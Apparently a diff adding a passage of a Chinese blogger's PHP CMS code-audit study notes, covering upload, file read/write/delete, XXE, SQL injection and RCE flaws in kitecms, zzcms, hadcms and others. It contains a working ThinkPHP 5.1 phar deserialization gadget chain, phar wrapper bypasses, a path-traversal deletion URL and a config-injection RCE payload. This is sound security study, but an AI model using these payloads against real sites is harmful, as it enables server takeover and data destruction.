+<p><img src="https://pic.imgdb.cn/item/67069b02d29ded1a8ccbd4b9.png" alt=""></p>
+<p>这里通过post获取<code>kety</code>，然后判断是不是文件就进行了删除</p>
+<p>所以可以抓一个删除包然后进行<code>../</code>的返回，类似这样</p>
+<p><img src="https://pic.imgdb.cn/item/67069b7ad29ded1a8ccc479d.png" alt=""></p>
+<p>至此，结束iboscms</p>
+<p>总结：</p>
+<p>yii框架有明显的过滤但是在module层没有封装好导致可能存在sql漏洞</p>
+<p>unlink危险函数</p>
+<hr>
+<h1>4. kitecms代码审计（2024年10月11日）</h1>
+<p>kitecms是基于thinkphp5搭建的，这个我搭建的时候按照两个方法都失败了，访问<code>/install</code>的时候安装不跳转，数据库安装倒是成功了<code>/config/database.php</code>也配置好了但是访问的时候报错</p>
+<p>就很奇怪</p>
+<p>所以我就单纯的看着教程和源码进行审计学习了</p>
+<p>thinkphp5.1比较上一代5.0，将配置目录和路由定义单独出来不在防御应用类库目录中（不可更改哦）</p>
+<h2>目录架构</h2>
+<pre><code>www WEB部署目录（或者子目录）
+├─application           应用目录
+│ ├─common             公共模块目录（可以更改）
+│ ├─module_name       模块目录
+│ │ ├─common.php     模块函数文件
+│ │ ├─controller     控制器目录
+│ │ ├─model           模型目录
+│ │ ├─view           视图目录
+│ │ ├─config         配置目录
+│ │ └─ ...           更多类库目录
+│ │
+│ ├─command.php       命令行定义文件
+│ ├─common.php         公共函数文件
+│ └─tags.php           应用行为扩展定义文件
+│
+├─config               应用配置目录
+│ ├─module_name       模块配置目录
+│ │ ├─database.php   数据库配置
+│ │ ├─cache           缓存配置
+│ │ └─ ...
+│ │
+│ ├─app.php           应用配置 相当于5.0中config.php
+│ ├─cache.php         缓存配置
+│ ├─cookie.php         Cookie配置
+│ ├─database.php       数据库配置
+│ ├─log.php           日志配置
+│ ├─session.php       Session配置
+│ ├─template.php       模板引擎配置
+│ └─trace.php         Trace配置
+│
+├─route                 路由定义目录
+│ ├─route.php         路由定义
+│ └─...               更多
+│
+├─public               WEB目录（对外访问目录）
+│ ├─index.php         入口文件
+│ ├─router.php         快速测试文件
+│ └─.htaccess         用于apache的重写
+│
+├─thinkphp             框架系统目录
+│ ├─lang               语言文件目录
+│ ├─library           框架类库目录
+│ │ ├─think           Think类库包目录
+│ │ └─traits         系统Trait目录
+│ │
+│ ├─tpl               系统模板目录
+│ ├─base.php           基础定义文件
+│ ├─convention.php     框架惯例配置文件
+│ ├─helper.php         助手函数文件
+│ └─logo.png           框架LOGO文件
+│
+├─extend               扩展类库目录
+├─runtime               应用的运行时目录（可写，可定制）
+├─vendor               第三方类库目录（Composer依赖库）
+├─build.php             自动生成定义文件（参考）
+├─composer.json         composer 定义文件
+├─LICENSE.txt           授权说明文件
+├─README.md             README 文件
+├─think                 命令行入口文件
+
+</code></pre>
+<h2>代码审计</h2>
+<p>由于该系统使用的是thinkphp框架，所以我们在审计的时候需要着重观察application文件夹下面的文件，</p>
+<pre><code>├admin                        后台代码
+├index                        前台代码
+├install                      安装代码
+├member                       用户注册以及会员的响应代码
+</code></pre>
+<h3>文件上传漏洞</h3>
+<p>（我没搭建成功，所以用的是教程里面的）</p>
+<p><img src="https://pic.imgdb.cn/item/6708c4bdd29ded1a8c820b42.png" alt="">
+这里是对上传的文件进行了配置，</p>
+<p>这里教程选择抓包查看路由配置信息</p>
+<p><img src="https://pic.imgdb.cn/item/6708cf8bd29ded1a8c8b3bc4.png" alt=""></p>
+<p><code>admin</code>的<code>site</code>的<code>config</code>，这里的html是伪静态，其实还是调用的<code>config()</code>方法</p>
+<p>（我们可以在<code>config</code>的<code>app.php</code>中看到他开了伪静态）</p>
+<p><img src="https://pic.imgdb.cn/item/6708d18bd29ded1a8c8cd1f8.png" alt=""></p>
+<p>打开<code>site.php</code>，查看里面的<code>config</code>函数</p>
+<p><img src="https://pic.imgdb.cn/item/6708d864d29ded1a8c92876f.png" alt=""></p>
+<p>20行调用了<code>isAjax</code>判断是否是Ajax请求，然后通过<code>Request::param</code>获取来自前端的数据并存储到<code>$request</code>中，</p>
+<p><img src="https://pic.imgdb.cn/item/6708e17dd29ded1a8c9be074.png" alt=""></p>
+<p>刚刚应该是在哦后台的时候添加了一个php的文件使得其可传输，所以我们我们抓一个上传的包看一眼就可以了</p>
+<p>上传包中都调用了<code>uploadFile</code>方法，全局搜索一下</p>
+<p><img src="https://pic.imgdb.cn/item/6708e213d29ded1a8c9c9ea2.png" alt=""></p>
+<p>这里调用了<code>Request::file</code>函数接收来自上传的文件,</p>
+<p>这里启了一个uploadfile的函数是获取当前站点id然后创建一个新的<code>uploadfile</code>的实例，跟踪一下</p>
+<p><img src="https://pic.imgdb.cn/item/6708e2e0d29ded1a8c9d8d80.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/6708e354d29ded1a8c9df8c6.png" alt=""></p>
+<p>首先从<code>config\site.php</code>获取site中的<code>uploadfile</code>和<code>imagewater</code>并且将其通过<code>array_merge</code>合并到一起，然后获取我们之前传入数据库的内容与配置文件进行合并</p>
+<p><img src="https://pic.imgdb.cn/item/6708e55bd29ded1a8ca06927.png" alt=""></p>
+<p>这里也做了一些限制</p>
+<p>继续顺着<code>uploadfile</code>，下面调用了<code>upload</code>函数，这里使用了<code>filetype</code>获取上传类型然后通过check检查后缀以及大小</p>
+<p><img src="https://pic.imgdb.cn/item/6708e600d29ded1a8ca129fd.png" alt=""></p>
+<p>case完了以后通过<code>upload</code>实现文件上传</p>
+<p>所以我们只需要在后台设置<code>.php</code>可上传，然后传就可以了</p>
+<h2>任意文件读写</h2>
+<p>通过全局搜索我们发现存在<code>file_put_contents</code>函数，</p>
+<p><img src="https://pic.imgdb.cn/item/670906eed29ded1a8cc0288e.png" alt=""></p>
+<p>而且里面的<code>html</code>参数可控，也就是说<code>file_put_contents</code>传入的内容可控</p>
+<p><code>htmlspecialchars_decode</code>是将由<code>htmlspecialchars</code>转换的html尸体进行解码，在前面的<code>rootpath</code>向上回溯发现是将根路径、主题文件夹、主题名称和文件相对路径拼接成一个完整的文件路径</p>
+<p><img src="https://pic.imgdb.cn/item/670909e1d29ded1a8cc24cef.png" alt=""></p>
+<p>这里的<code>$rootpath</code>通过param接收<code>$path</code>，而path是request获得的path路径，所以这个地方的<code>$path</code>可控</p>
+<p><img src="https://pic.imgdb.cn/item/67090af7d29ded1a8cc31ab3.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/67090b05d29ded1a8cc32612.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/67090a8bd29ded1a8cc2cf87.png" alt=""></p>
+<p>这里 相当于本来在<code>404.txt</code>中写但是改成了在<code>robots.txt</code>中加了一句<code>ceshi</code>,实现了任意文件读写</p>
+<h2>任意文件读取</h2>
+<p>全局搜索<code>file_get_contents</code>，发现在上面那个<code>file_put_contents</code>的在一个函数中，分析一下发现</p>
+<p><img src="https://pic.imgdb.cn/item/6709262cd29ded1a8cd89d33.png" alt=""></p>
+<p>他判断是不是post传参，如果不是的话走下面的else判断里面的<code>rootpath</code>，上面我们分析了<code>rootpath</code>里面的<code>$path</code>可控，所以这里会造成任意文件读取</p>
+<p><img src="https://pic.imgdb.cn/item/670927f3d29ded1a8cd9facd.png" alt=""></p>
+<p>它上面最后调用了</p>
+<pre><code>            return $this-&gt;fetch(&#39;fileedit&#39;, $data);
+</code></pre>
+<p>渲染<code>filedit</code>并将<code>$data</code>传给他</p>
+<p>所以存在任意文件读取</p>
+<p><img src="https://pic.imgdb.cn/item/67092889d29ded1a8cda81b5.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/670928a6d29ded1a8cda9cda.png" alt=""></p>
+<h2>phar反序列化</h2>
+<p>php使用的是内置的流包装器实现复杂的文件处理共嗯，内置包装器可用与文件系统函数</p>
+<pre><code class="language-常见的流包装器">
+file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器
+http:// — 访问 HTTP(s) 网址
+ftp:// — 访问 FTP(s) URLs
+php:// — 访问各个输入/输出流（I/O streams）
+zlib:// — 压缩流
+data:// — 数据（RFC 2397）
+glob:// — 查找匹配的文件路径模式
+phar:// — PHP 归档
+ssh2:// — Secure Shell 2
+rar:// — RAR
+ogg:// — 音频流
+expect:// — 处理交互式的流
+
+</code></pre>
+<p><img src="https://pic.imgdb.cn/item/6709305dd29ded1a8ce15840.png" alt=""></p>
+<h3>phar生成</h3>
+<pre><code>&lt;?php
+    class TestObject {
+    }
+    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar
+    $phar-&gt;startBuffering();
+    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
+    $o = new TestObject();
+    $o -&gt; data=&#39;hu3sky&#39;;
+    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest
+    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+    //签名自动计算
+    $phar-&gt;stopBuffering();
+?&gt;
+</code></pre>
+<h3>phar文件必要的结构组成</h3>
+<blockquote>
+<p>stub:phar文件的标志，必须以 xxx __HALT_COMPILER();?&gt; 结尾，否则无法识别。xxx可以为自定义内容。</p>
+</blockquote>
+<blockquote>
+<p>manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。</p>
+</blockquote>
+<blockquote>
+<p>content:被压缩文件的内容</p>
+</blockquote>
+<blockquote>
+<p>signature (可空):签名，放在末尾。</p>
+</blockquote>
+<h3>绕过方法：</h3>
+<p>环境限制phar不能出现在前面的字符中，可以使用<code>compress.bzip2://</code>和<code>compress.bzip://</code>进行绕过</p>
+<pre><code>compress.bzip://phar:///test.phar/test.txt
+compress.bzip2://phar:///test.phar/test.txt
+compress.zlib://phar:///home/sx/test.phar/test.txt
+</code></pre>
+<p>或者使用其他协议</p>
+<pre><code>php://filter/read=convert.base64-encode/resource=phar://phar.phar
+
+</code></pre>
+<p>GIF格式验证中可以通过在文件头部添加GIT89a绕过</p>
+<pre><code>- $phar-&gt;setStub(&quot;GIF89a&quot;,&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);
+
+- 生成一个phar.phar 改名为phar.gif
+</code></pre>
+<h3>危害</h3>
+<p>攻击者可以通过PHAR反序列化漏洞来实现一下攻击：</p>
+<ol>
+<li>远程代码执行：攻击者可以利用反序列化漏洞来远程执行任意php代码并获取服务器完全控制权</li>
+<li>信息泄露：攻击者可以利用反序列化漏洞来读取服务器上的敏感数据，如数据库凭证，身份验证密码等</li>
+<li>篡改数据：攻击者可以利用反序列化漏洞改变服务器上的数据，如篡改网站内容，篡改数据库数据等</li>
+</ol>
+<h3>防范措施</h3>
+<ol>
+<li>及时更新代码中利用phar的库或插件，以修复已知的漏洞</li>
+<li>对用户输入的信息进行过滤和验证，确保输入的数据不包含恶意代码</li>
+<li>金庸不必要的反序列化对象或者对反序列化对象进行严格控制</li>
+<li>使用php的反序列化检测攻击检查潜在的远程代码执行漏洞</li>
+</ol>
+<p>这里的<code>$dir</code>参数完全可控，并且进入<code>is_dir()</code></p>
+<p><img src="https://pic.imgdb.cn/item/670a40cdd29ded1a8cb1d949.png" alt=""></p>
+<p>写tp5.1反序列化利用链生成phar文件</p>
+<pre><code>&lt;?php
+namespace think\process\pipes {
+  class Windows
+ {
+    private $files;
+    public function __construct($files)
+   {
+      $this-&gt;files = [$files];
+   }
+ }
+}
+namespace think\model\concern {
+  trait Conversion
+ {
+ }
+  trait Attribute
+ {
+    private $data;
+    private $withAttr = [&quot;v&quot; =&gt; &quot;system&quot;];
+    public function get()
+   {
+      $this-&gt;data = [&quot;v&quot; =&gt; &quot;calc&quot;];
+   }
+ }
+#这里生成我们的pahr文件，如果生成时报错了可以将php.ini配置文件中的phar.readonly选项设置为
+#Off就可以成功生成了。
+
+}
+namespace think {
+  abstract class Model
+ {
+    use model\concern\Attribute;
+    use model\concern\Conversion;
+ }
+}
+namespace think\model{
+  use think\Model;
+  class Pivot extends Model
+ {
+    public function __construct()
+   {
+      $this-&gt;get();
+   }
+ }
+}
+namespace {
+  $conver = new think\model\Pivot();
+  $a = new think\process\pipes\Windows($conver);
+  @unlink(&quot;phar.phar&quot;);
+  $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar
+  $phar-&gt;startBuffering();
+  $phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub
+  $phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest
+  $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件
+//签名自动计算
+  $phar-&gt;stopBuffering();
+}
+?&gt;
+</code></pre>
+<p>打开访问会自动生成<code>phar.phar</code>（如果报错的话是因为你的<code>php.ini</code>里面没打开<code>phar_onreadly=off</code>）</p>
+<p><img src="https://pic.imgdb.cn/item/670b4891d29ded1a8c85b6c1.png" alt=""></p>
+<p>在010editor里面能看到我们的数据都写进去了</p>
+<p><img src="https://pic.imgdb.cn/item/670b48b0d29ded1a8c85ccf0.png" alt=""></p>
+<p>漏洞复现里面是在kitecms里面上传了phar.phar，改后缀为<code>.jpg</code>,</p>
+<p><img src="https://pic.imgdb.cn/item/670b4912d29ded1a8c861136.png" alt=""></p>
+<p>用phar协议解析就可以弹计算器</p>
+<p><img src="https://pic.imgdb.cn/item/670b4949d29ded1a8c8636fb.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/670b497ad29ded1a8c865846.png" alt=""></p>
+<p>顺便补一句这个下面的<code>$dir</code>也是可控的，所以也可以利用</p>
+<p><a href="http://127.0.0.1/admin/admin/scanFilesForTree?dir=phar://%E5%9C%B0%E5%9D%80">http://127.0.0.1/admin/admin/scanFilesForTree?dir=phar://地址</a></p>
+<h2>日志文件泄露</h2>
+<p><img src="https://pic.imgdb.cn/item/670b4ff7d29ded1a8c8e0aa3.png" alt=""></p>
+<p>在<code>config/app.php/log</code>中开启了调试模式，</p>
+<p><img src="https://pic.imgdb.cn/item/670b505bd29ded1a8c8f353c.png" alt=""></p>
+<p>也就是说开启了日志记录</p>
+<p><a href="https://pic.imgdb.cn/item/670b50a9d29ded1a8c902826.png">https://pic.imgdb.cn/item/670b50a9d29ded1a8c902826.png</a></p>
+<p>在日志配置文件<code>config/log.php</code>里面发现默认开启了日志记录</p>
+<p>访问<code>/runtime/log</code>目录，使用bp求情就能得到log日志文件</p>
+<h2>文件上传第二处</h2>
+<p><code>application/member/controller/Upload.php</code></p>
+<p><img src="https://pic.imgdb.cn/item/670b524ed29ded1a8c983e37.png" alt=""></p>
+<p>跟踪一下<code>upload</code>函数发现</p>
+<p>他只检查了后缀和大小，</p>
+<p><img src="https://pic.imgdb.cn/item/670b52b8d29ded1a8c993f0a.png" alt=""></p>
+<p>所以可以在会员中心，对着这个</p>
+<p><img src="https://pic.imgdb.cn/item/670b5317d29ded1a8c9a4b8d.png" alt=""></p>
+<p>然后修改上传的png为php</p>
+<p><img src="https://pic.imgdb.cn/item/670b532fd29ded1a8c9aca51.png" alt=""></p>
+<p>就能访问到phpinfo文件了</p>
+<hr>
+<h1>5. zzcms代码审计（2024年10月13日）</h1>
+<h2>框架目录</h2>
+<pre><code>/install 安装程序目录（安装时必须有可写入权限）
+/admin 默认后台管理目录（可任意改名）
+/user 注册用户管理程序存放目录
+/skin 用户网站模板存放目录;
+/template 系统模板存放目录;
+/inc 系统所用包含文件存放目录
+/area 各地区显示文件存放目录
+/zhaoshang 招商程序文件存放目录
+/daili 代理
+/zhanhui 展会
+/company 企业
+/job 招聘
+/zixun 资讯
+/special专题
+/pinpai 品牌
+/wangkan 网络刊物
+/zhanting 注册用户展厅页程序
+/one 专存放单页面，如公司简介页，友情链接页，帮助页都放在这个目录里了
+/ajax ajax程序处理页面
+/reg 用户注册页面
+/3 第三方插件存放目录
+  /3/ckeditor CK编缉器程序存放目录
+  /3/alipay 支付宝在线支付系统存放目录
+  /3/tenpay 财富通在线支付系统存放目录
+  /3/qq_connect2.0 qq登陆接口文件
+  /3/ucenter_api discuz论坛用户同步登陆接口文件
+  /3/kefu 在线客服代码
+  /3/mobile_msg 第三方手机短信API
+  /3/phpexcelreader PHP读取excel文件组件
+/cache 缓存文件放目录
+/html 生成的静态页存放目录
+/uploadfiles 上传文件存放目录
+/daili_excel 要导入的代理信息excel表格文件上传目录
+/image 程序设计图片,swf文件存放目录
+/flash 展厅用透明flash装饰动画存放目录
+/js js文件存放目录
+/web.config 伪静态规则文件适用于 iis7服务器(万网比较常用)
+/httpd.ini 伪静态规则文件适用于 iis6服务器
+/.htaccess 伪静态规则文件适用于Apache 服务器
+/nginx.conf 伪静态规则文件适用Nginx服务器
+
+</code></pre>
+<h2>前台任意文件写入</h2>
+<p>使用Fortify自动审计工具时发现可能存在一个xxe漏洞，</p>
+<p><img src="https://pic.imgdb.cn/item/670bd341d29ded1a8c22360b.png" alt=""></p>
+<p><code>xml_parse</code>解析xml文档，搜索他的方法<code>parse</code></p>
+<p><img src="https://pic.imgdb.cn/item/670be4bdd29ded1a8c316f6f.png" alt=""></p>
+<p>发现<code>xml_unserialize</code>对<code>parse()</code>函数进行了调用，再去搜索</p>
+<p><img src="https://pic.imgdb.cn/item/670ca7d5d29ded1a8cb97562.png" alt=""></p>
+<p>这里是从post中获取原始的数据流</p>
+<p>上面的ertu<code>parse_Str</code>是将解码后的字符串解析为变量并存储在<code>$get</code>中，而上面的<code>$code</code>可控，而<code>$code</code>经过<code>_authcode</code>的处理，跟进一下发现大概是加解密字符串的,<code>$string</code>是需要加解密的字符串，也就是<code>$code</code>，$operation 默认为DECODE也就是解密字符串，而 $key 则为加解密的秘钥。</p>
+<blockquote>
+<p>他说这里的默认密钥是123456，我真没看出来那里说了是123456</p>
+</blockquote>
+<p><img src="https://pic.imgdb.cn/item/670cb03bd29ded1a8cbfbc47.png" alt=""></p>
+<p>因为<code>code</code>可控，所以下面的<code>$time,$action</code>可控</p>
+<p>59行判断传入的<code>$action</code>是否在数组中,是的话继续运行并讲<code>$get,post</code>以参数形式传输，所以<code>$get,post</code>也可控</p>
+<p><img src="https://pic.imgdb.cn/item/670cb021d29ded1a8cbfab99.png" alt=""></p>
+<p>所以我们可以去数组中找找有没有危险操作的</p>
+<p><code>updateapps</code>里面有一个<code>fwrite</code>,接收的<code>UC-API</code>可控，而且下面的fwrite是将我们输入的信息进行正则匹配进行替换，所以可以实现任意文件读写</p>
+<p><img src="https://pic.imgdb.cn/item/670cb35ed29ded1a8cc1fae5.png" alt=""></p>
+<h3>测试</h3>
+<p>因为这里的东西限制了我们两条</p>
+<p><img src="https://pic.imgdb.cn/item/670cf31fd29ded1a8c04ac38.png" alt=""></p>
+<ol>
+<li><code>$timestamp - $get[&#39;time&#39;] &gt; 3600</code></li>
+<li><code>$get[&#39;action&#39;]=updateapps;</code></li>
+</ol>
+<p>并且要经过_authcode（）解码，所以我们要先讲<code>$code</code>编码</p>
+<p>这里我也找到了<code>UC-KEY</code>---他在配置文件中说是默认为123456，也就解释了上面的123456的默认</p>
+<p><img src="https://pic.imgdb.cn/item/670cfc0bd29ded1a8c0e4d6e.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/670d0d19d29ded1a8c270940.png" alt=""></p>
+<p>这里说明了要按照xml的格式进行编写，所以就有了</p>
+<p><img src="https://pic.imgdb.cn/item/670cfc81d29ded1a8c0edb68.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/670cfc9bd29ded1a8c0ef622.png" alt=""></p>
+<h2>任意文件删除</h2>
+<p>全局搜索<code>unlink</code>的时候发现这么一个东西</p>
+<p><img src="https://pic.imgdb.cn/item/670d1e79d29ded1a8c3cc9bb.png" alt=""></p>
+<p>追踪一下<code>unlink</code>的<code>file</code>发现<code>action</code>和<code>mlname</code>可控</p>
+<p><img src="https://pic.imgdb.cn/item/670d1fb3d29ded1a8c3ddba1.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/670d202fd29ded1a8c3e5137.png" alt=""></p>
+<p>这里的<code>mlname</code>可控，他传入文件夹名给<code>ml</code>然后遍历整个文件夹下的文件，最将文件名赋值给<code>file</code>然后通过<code>unlink</code>删除</p>
+<p>当文件夹下的文件全部被删除后再通过<code>rmdir</code>删除传入的文件夹</p>
+<p>payload：</p>
+<pre><code>/admin/uploadfile_nouse.php?action=del&amp;mlname=..\文件夹名字
+</code></pre>
+<h2>前端xss漏洞</h2>
+<p>该系统没有按照mvc开发模式进行开发，导致大部分前后端代码都在一个php文件中，</p>
+<p><img src="https://pic.imgdb.cn/item/670def3bd29ded1a8cd10b09.png" alt=""></p>
+<p>这里的两个参数<code>imgid</code>和<code>noshuiyin</code>参数可控，</p>
+<p><img src="https://pic.imgdb.cn/item/670dfa34d29ded1a8cd9de07.png" alt=""></p>
+<h2>sql注入</h2>
+<p>这里的<code>classname</code>是可控的，从上面要求<code>action=modify</code>是一个条件，</p>
+<p><img src="https://pic.imgdb.cn/item/6710c0a3d29ded1a8c00f6b5.png" alt=""></p>
+<p>从这php开头可以看到<code>dowhat</code>是可控的</p>
+<p><img src="https://pic.imgdb.cn/item/6710c098d29ded1a8c00ed73.png" alt=""></p>
+<p>所以应该还有个条件是<code>dowhat=modifybigclass</code></p>
+<p><img src="https://pic.imgdb.cn/item/6710c13dd29ded1a8c016c12.png" alt=""></p>
+<pre><code>payload=classname= xxxxxxx（自己填写sql语句）
+</code></pre>
+<h2>总结：</h2>
+<ol>
+<li>如果限制了登录失败次数像是10次这种，可以看源码中是否通过ip来进行限制的，如果是的话可以在爆破的时候将ip的第一位也爆破一下</li>
+<li>sql注入的相关漏洞可以看<code>select *</code>这种的东西，后面看是否传入的参数可控</li>
+<li>还是危险函数</li>
+<li>在正常的使用中可能有些不是传统的mvn框架所以我们要对目事先录框架进行分析</li>
+<li>可以使用Fortify以及seay等工具对参数先进行分析，这样方便我们后期的审计</li>
+</ol>
+<hr>
+<h1>6. yzmcms代码审计（2024年10月21日）</h1>
+<p>路由蛮清晰的，直接开始</p>
+<h2>可能存在的sql注入</h2>
+<p>我在</p>
+<p><img src="https://pic.imgdb.cn/item/67163a01d29ded1a8c4857d5.png" alt=""></p>
+<p>里面看到他所在的路由地址</p>
+<p><img src="https://pic.imgdb.cn/item/67163a2dd29ded1a8c48c83c.png" alt=""></p>
+<p>查看本地原码的时候发现</p>
+<p><img src="https://pic.imgdb.cn/item/67163a4dd29ded1a8c4916da.png" alt=""></p>
+<p>这里 仅仅使用了 <code>strip_tags</code>提取tablename的值，并且tablename可控，所以就猜测可能存在sql注入</p>
+<p>但是下面的这行限制只能存在数字和字母，以及下划线，并且必须是字母开头</p>
+<p><img src="https://pic.imgdb.cn/item/67163abbd29ded1a8c4a0f0d.png" alt=""></p>
+<p>但是我一时没想到只有数字和字母的sql语句</p>
+<h2>xss and upload?</h2>
+<p>在后台设置了lv1可发布内容之后，在发布点发现两个功能点，查看xss的发现限制了</p>
+<p><img src="https://pic.imgdb.cn/item/67176595d29ded1a8c283c0e.png" alt=""></p>
+<p>其中的<code>strip_tags</code>删除<code>tablename</code>输入中的所有php标签和html标签</p>
+<p>后面使用了<code>trim</code>清理<code>alias</code>输入的开头和结尾的空格</p>
+<p>这里避免了xss漏洞</p>
+<p>而另一个</p>
+<p><img src="https://pic.imgdb.cn/item/6717660bd29ded1a8c292c0f.png" alt=""></p>
+<p>这里面的通过<code>handle_upload_types</code>设置允许伤处啊你的文件类型以及参数</p>
+<p><img src="https://pic.imgdb.cn/item/67176662d29ded1a8c29e6cf.png" alt=""></p>
+<p>里面设置了可以传照片视频docxppt以及表格等等，但是不然上传php以及txt</p>
+<p>后面使用了</p>
+<p><img src="https://pic.imgdb.cn/item/671766b2d29ded1a8c2a979b.png" alt=""></p>
+<p>删除原来的上传文件的地址并设置了新的地址避免目录遍历</p>
+<p>我尝试了使用文件包含jpg啥的都不行</p>
+<p><img src="https://pic.imgdb.cn/item/6717670dd29ded1a8c2b7aab.png" alt=""></p>
+<hr>
+<h1>7. hadcms代码审计（2024年10月26日）</h1>
+<h2>任意文件写入</h2>
+<p>全局搜索<code>file_put_contents</code>的时候发现</p>
+<p><img src="https://pic.imgdb.cn/item/671ca80fd29ded1a8c0310e4.png" alt=""></p>
+<p>往上回溯发现它是通过weitch..case来控制<code>file_put_contentts</code>的，而下面的path也就是我们通过POST传入的</p>
+<p>23-35行对路径真实性进行了检验</p>
+<p>如果不存在弹出路径不存在的提示并返回JSON响应,并且限制了不能创建新的文件夹</p>
+<p><img src="https://pic.imgdb.cn/item/671cadc7d29ded1a8c09fc8a.png" alt=""></p>
+<p>所以我们确定了传入的内容<code>type=save</code></p>
+<p>path要求是必须真实存在的路径，</p>
+<p><img src="https://pic.imgdb.cn/item/671cb670d29ded1a8c148588.png" alt=""></p>
+<p>suffixs一开始就限制了类型</p>
+<p><img src="https://pic.imgdb.cn/item/671cb69cd29ded1a8c14aa09.png" alt=""></p>
+<p>这里只是判断了一下是否符合格式，但是没过滤php文件</p>
+<p>所以可以通过nkdire来创建新测目录文件</p>
+<p><img src="https://pic.imgdb.cn/item/671cb729d29ded1a8c152efd.png" alt=""></p>
+<h3>测试</h3>
+<p><img src="https://pic.imgdb.cn/item/671dedc5d29ded1a8c05f16c.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/671dedc5d29ded1a8c05f18e.png" alt=""></p>
+<h2>任意文件删除</h2>
+<p>在上面的基础上这里有一个</p>
+<p><img src="https://pic.imgdb.cn/item/671dee46d29ded1a8c065c5e.png" alt=""></p>
+<p>由于上面的分析可知path和type是可控的，所以构成任意文件删除漏洞</p>
+<h2>任意文件删除+rce</h2>
+<p>存在任意文件删除的时候，我们可以进行locked锁文件的删除以重装，而且在重装界面我们能看到我们的数据库信息会记录到config.php中</p>
+<p><img src="https://pic.imgdb.cn/item/671f525dd29ded1a8c0b4516.png" alt=""></p>
+<p>当我们安装的时候，就会对配置文件进行写入，但是写入的时候没有过滤，这就导致我们可以进行rce</p>
+<p><img src="https://pic.imgdb.cn/item/671f5398d29ded1a8c0d5e37.png" alt=""></p>
+<p>后面是对数据库进行连接，创建等操作,但是不能随意输入，如果数据库执行期间报错会导致后面安装不成功，config,php无法写入</p>
+<p><img src="https://pic.imgdb.cn/item/671f5472d29ded1a8c0e1924.png" alt=""></p>
+<p>最上面的代码限制了我们不能随意访问该文件，但是<code>$_G</code>中内容可控，经过尝试发现只有这里的 <code>mysql_prefix</code> 参数也就是数据库前缀这里是可以完全控制的，其他参数如果拼接特殊字符会导致数据库语句执行报错</p>
+<p>config.php中可知，必须定义puyuetian常量才能正常访问该文件，所以显然不能直接访问而要通过特定路由，但是index.php中包含了puyueyian.php，所以只要能正常安装成功就能进行rce</p>
+<p><img src="https://pic.imgdb.cn/item/671f620ed29ded1a8c1e8584.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/671f621cd29ded1a8c1e9593.png" alt=""></p>
+<h3>测试</h3>
+<p><img src="https://pic.imgdb.cn/item/671f6f15d29ded1a8c2c0f57.png" alt=""></p>
+<pre><code class="language-payload地方">/*!&#39;; phpinfo();//
+</code></pre>
+<h2>任意文件读取</h2>
+<p><img src="https://pic.imgdb.cn/item/6725e7f7d29ded1a8c813f59.png" alt=""></p>
+<p>注意一下前置，<code>suffixs</code>允许的尾缀是这个，前面我们分析了path可控</p>
+<p>而且在下面发现了回显</p>
+<p><img src="https://pic.imgdb.cn/item/67262db0d29ded1a8cb7b5ec.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/67262db0d29ded1a8cb7b621.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/67262dd6d29ded1a8cb7d756.png" alt=""></p>
+<h2>模板上传绕过getshell</h2>
+<p>在<code>/app/superadmin/phpscript/app.php</code>中</p>
+<p><img src="https://pic.imgdb.cn/item/672739c5d29ded1a8c70d1ea.png" alt=""></p>
+<p>有一个<code>		if (!InArray(&#39;hsa,zip&#39;, $suffix)) {</code>检查尾缀是否为.zip文件，然后在下面用到了<code>ziparchive::extractTo()</code></p>
+<p><img src="https://pic.imgdb.cn/item/67273aa0d29ded1a8c718402.png" alt=""></p>
+<pre><code>ziparchive 部分使用方法
+&lt;?php
+/******** ziparchive 可选参数 *******/
+/*
+1.ZipArchive::addEmptyDir
+添加一个新的文件目录
+2.ZipArchive::addFile
+将文件添加到指定zip压缩包中。
+3.ZipArchive::addFromString
+添加的文件同时将内容添加进去
+4.ZipArchive::close
+关闭ziparchive
+5.ZipArchive::extractTo
+将压缩包解压
+6.ZipArchive::open
+打开一个zip压缩包
+7.ZipArchive::getStatusString
+返回压缩时的状态内容，包括错误信息，压缩信息等等
+8.ZipArchive::deleteIndex
+删除压缩包中的某一个文件，如：deleteIndex(0)删除第一个文件
+9.ZipArchive::deleteName
+删除压缩包中的某一个文件名称，同时也将文件删除。
+?&gt;
+</code></pre>
+<hr>
+<h1>8. xinhucms代码审计（2024年11月8日）</h1>
+<p>信呼cms将后端代码都放置在webmain目录下，而且访问方式都是</p>
+<pre><code>
+index.php?a=文件名&amp;d=文件对应名&amp;m=模块
+</code></pre>
+<h2>shell</h2>
+<p><img src="https://pic.imgdb.cn/item/673af490d29ded1a8c6e292a.png" alt="">
+在这个地方我们发现可以看到一个上传文档点</p>
+<p><img src="https://pic.imgdb.cn/item/673af4c2d29ded1a8c6e55a2.png" alt=""></p>
+<p>抓包发现在<code>upload</code>文件下<code>upload</code>文件的<code>public</code>模块</p>
+<p>追踪到<code>uploadAction.php</code>里面的<code>upfileAjax</code></p>
+<p><img src="https://pic.imgdb.cn/item/673af651d29ded1a8c6fc8f5.png" alt=""></p>
